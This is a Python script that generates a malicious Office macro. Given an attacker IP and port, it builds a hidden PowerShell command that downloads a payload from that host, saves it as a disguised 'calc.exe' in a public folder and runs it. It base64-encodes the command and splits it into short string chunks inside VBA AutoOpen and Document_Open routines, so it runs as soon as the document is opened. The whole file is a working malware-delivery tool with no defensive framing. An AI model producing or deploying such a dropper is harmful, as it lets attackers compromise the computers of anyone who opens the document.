import base64
import argparse
import os

def main():
    parser = argparse.ArgumentParser(description='Generate malicious Office macro')
    parser.add_argument('--ip', required=True, help='Attacker IP address')
    parser.add_argument('--port', required=True, help='Attacker port')
    parser.add_argument('--payload', required=True, help='Payload file name (используется только имя файла)')
    parser.add_argument('--upload-to', help='Path to save payload', default='C:\\Users\\Public\\Documents\\calc.exe')
    
    args = parser.parse_args()

    payload_filename = os.path.basename(args.payload)

    ps_command = f"""
$client = New-Object System.Net.WebClient
$client.DownloadFile('http://{args.ip}:{args.port}/{payload_filename}', '{args.upload_to}')
Start-Process '{args.upload_to}' -WindowStyle Hidden
"""

    encoded_script = base64.b64encode(ps_command.encode('utf-16le')).decode()
    cmdline = f"powershell.exe -nop -w hidden -e {encoded_script}"
    
    macro_template = """Sub AutoOpen()
    AutoOpenMacro
End Sub

Sub Document_Open()
    AutoOpenMacro
End Sub

Sub AutoOpenMacro()
    Dim Str As String
"""
    
    chunks = [cmdline[i:i+50] for i in range(0, len(cmdline), 50)]
    
    for chunk in chunks:
        macro_template += f'    Str = Str + "{chunk}"\n'
    
    macro_template += """    CreateObject("Wscript.Shell").Run Str
End Sub
"""

    print(macro_template)

if __name__ == "__main__":
    main()
